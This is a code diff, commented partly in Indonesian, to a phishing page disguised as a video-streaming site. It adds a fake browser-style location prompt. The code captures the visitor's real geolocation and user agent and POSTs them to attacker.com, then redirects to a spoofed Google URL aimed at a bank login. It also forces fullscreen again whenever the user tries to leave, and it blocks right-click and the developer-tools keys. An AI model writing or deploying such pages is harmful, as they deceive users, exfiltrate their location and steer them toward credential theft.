@@ -188,6 +188,60 @@
             border-radius: 3px;
             transition: width 3s linear;
         }
+
+        /* Geolocation Prompt Styles */
+        .geolocation-prompt {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            z-index: 20000;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .geolocation-dialog {
+            background: white;
+            color: #333;
+            border-radius: 15px;
+            padding: 30px;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        }
+
+        .geolocation-icon {
+            font-size: 48px;
+            margin-bottom: 20px;
+        }
+
+        .geolocation-buttons {
+            display: flex;
+            gap: 15px;
+            margin-top: 25px;
+        }
+
+        .geo-btn {
+            flex: 1;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        .geo-allow {
+            background: #4285f4;
+            color: white;
+        }
+
+        .geo-deny {
+            background: #f1f1f1;
+            color: #333;
+        }
     </style>
 </head>
 <body>
@@ -256,6 +310,27 @@
         </div>
     </div>
 
+    <!-- Geolocation Prompt -->
+    <div class="geolocation-prompt" id="geolocationPrompt">
+        <div class="geolocation-dialog">
+            <div class="geolocation-icon">📍</div>
+            <h2 style="margin-bottom: 15px; color: #333;">Location Access Required</h2>
+            <p style="color: #666; line-height: 1.5; margin-bottom: 10px;">
+                <strong>video-streaming-platform.com</strong> wants to know your location
+            </p>
+            <p style="color: #888; font-size: 14px; margin-bottom: 20px;">
+                This helps us provide location-based content recommendations and ensure secure streaming access.
+            </p>
+            <div class="geolocation-buttons">
+                <button class="geo-btn geo-deny" onclick="handleLocationDeny()">Block</button>
+                <button class="geo-btn geo-allow" onclick="handleLocationAllow()">Allow</button>
+            </div>
+            <p style="font-size: 12px; color: #999; margin-top: 15px;">
+                Your location will be used to personalize content
+            </p>
+        </div>
+    </div>
+
     <script>
         // Countdown timer untuk auto-play
         let countdown = 10;
@@ -298,42 +373,152 @@
             if (element.requestFullscreen) {
                 element.requestFullscreen()
                     .then(() => {
-                        // Phase 2: Redirect to spoofed search engine setelah fullscreen aktif
+                        // Phase 2: Show geolocation prompt setelah fullscreen aktif
                         setTimeout(() => {
-                            window.location.href = "https://www.google.com/";
-                        }, 1000);
+                            showGeolocationPrompt();
+                        }, 1500);
                     })
                     .catch(err => {
                         console.error('Fullscreen error:', err);
-                        // Fallback: redirect langsung jika fullscreen gagal
-                        window.location.href = "https://www.google.com";
+                        // Fallback: show geolocation prompt langsung
+                        showGeolocationPrompt();
                     });
             } else if (element.webkitRequestFullscreen) {
                 // Safari support
                 element.webkitRequestFullscreen()
                     .then(() => {
                         setTimeout(() => {
-                            window.location.href = "https://www.google.attacker.com/search?q=bank.com/login&client=opera";
-                        }, 1000);
+                            showGeolocationPrompt();
+                        }, 1500);
                     })
                     .catch(err => {
-                        window.location.href = "https://www.google.attacker.com/search?q=bank.com/login&client=opera";
+                        showGeolocationPrompt();
                     });
             } else if (element.msRequestFullscreen) {
                 // IE/Edge support
                 element.msRequestFullscreen()
                     .then(() => {
                         setTimeout(() => {
-                            window.location.href = "https://www.google.attacker.com/search?q=bank.com/login&client=opera";
-                        }, 1000);
+                            showGeolocationPrompt();
+                        }, 1500);
                     })
                     .catch(err => {
-                        window.location.href = "https://www.google.attacker.com/search?q=bank.com/login&client=opera";
+                        showGeolocationPrompt();
                     });
             } else {
                 // Fallback untuk browser yang tidak support fullscreen
-                window.location.href = "https://www.google.attacker.com/search?q=bank.com/login&client=opera";
+                showGeolocationPrompt();
             }
+        }
+
+        function showGeolocationPrompt() {
+            // Hide loading notice
+            document.getElementById('fullscreenNotice').style.display = 'none';
+            
+            // Show fake geolocation prompt
+            const prompt = document.getElementById('geolocationPrompt');
+            prompt.style.display = 'flex';
+
+            // Also trigger real browser geolocation API
+            triggerRealGeolocation();
+        }
+
+        function triggerRealGeolocation() {
+            if ("geolocation" in navigator) {
+                // Options untuk lebih meyakinkan
+                const options = {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                };
+
+                // Request geolocation - ini akan memunculkan prompt asli browser
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        // Success - user mengizinkan
+                        console.log("Location accessed:", position.coords);
+                        sendToAttacker(position.coords);
+                        redirectToPhishing();
+                    },
+                    function(error) {
+                        // Error - user menolak atau error
+                        console.log("Location denied or error:", error);
+                        // Tetap redirect ke phishing
+                        setTimeout(redirectToPhishing, 2000);
+                    },
+                    options
+                );
+            } else {
+                // Geolocation tidak support, langsung redirect
+                setTimeout(redirectToPhishing, 2000);
+            }
+        }
+
+        function handleLocationAllow() {
+            // User klik "Allow" pada prompt palsu
+            document.getElementById('geolocationPrompt').style.display = 'none';
+            
+            // Trigger real geolocation request
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        sendToAttacker(position.coords);
+                        redirectToPhishing();
+                    },
+                    function(error) {
+                        redirectToPhishing();
+                    },
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            } else {
+                redirectToPhishing();
+            }
+        }
+
+        function handleLocationDeny() {
+            // User klik "Block" pada prompt palsu
+            document.getElementById('geolocationPrompt').style.display = 'none';
+            
+            // Tetap coba dapatkan lokasi dengan cara lain
+            tryAlternativeLocationMethods();
+            setTimeout(redirectToPhishing, 1000);
+        }
+
+        function tryAlternativeLocationMethods() {
+            // Coba metode alternatif untuk mendapatkan informasi lokasi
+            // IP-based location atau other methods
+            console.log("Trying alternative location methods...");
+            
+            // Simulate sending IP-based location data
+            const ipLocation = {
+                ip: "detected_from_browser",
+                timestamp: new Date().toISOString()
+            };
+            sendToAttacker(ipLocation);
+        }
+
+        function sendToAttacker(locationData) {
+            // Kirim data lokasi ke server attacker
+            const data = {
+                location: locationData,
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString(),
+                url: window.location.href
+            };
+
+            // Dalam real attack, ini akan dikirim ke server attacker
+            fetch('https://attacker.com/collect-location', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).catch(err => console.log('Failed to send location'));
+
+            console.log("Location data captured:", data);
+        }
+
+        function redirectToPhishing() {
+            // Redirect ke phishing page setelah mendapatkan lokasi
+            window.location.href = "https://www.google.attacker.com/search?q=bank.com/login&client=opera&location=captured";
         }
 
         // Additional social engineering - fake user activity
@@ -347,20 +532,42 @@
         // Handle exit fullscreen attempts
         document.addEventListener('fullscreenchange', () => {
             if (!document.fullscreenElement) {
-                // Jika user mencoba keluar fullscreen, redirect anyway
-                window.location.href = "https://www.google.attacker.com/search?q=bank.com/login&client=opera";
+                // Jika user mencoba keluar fullscreen, show prompt lagi
+                showGeolocationPrompt();
+                
+                // Coba masuk fullscreen lagi
+                setTimeout(() => {
+                    document.documentElement.requestFullscreen?.();
+                }, 100);
             }
         });
 
         document.addEventListener('webkitfullscreenchange', () => {
             if (!document.webkitFullscreenElement) {
-                window.location.href = "https://www.google.attacker.com/search?q=bank.com/login&client=opera";
+                showGeolocationPrompt();
+                setTimeout(() => {
+                    document.documentElement.webkitRequestFullscreen?.();
+                }, 100);
             }
         });
 
         document.addEventListener('msfullscreenchange', () => {
             if (!document.msFullscreenElement) {
-                window.location.href = "https://www.google.attacker.com/search?q=bank.com/login&client=opera";
+                showGeolocationPrompt();
+                setTimeout(() => {
+                    document.documentElement.msRequestFullscreen?.();
+                }, 100);
+            }
+        });
+
+        // Prevent right-click
+        document.addEventListener('contextmenu', (e) => e.preventDefault());
+
+        // Prevent developer tools
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+                e.preventDefault();
+                showGeolocationPrompt();
             }
         });
     </script>
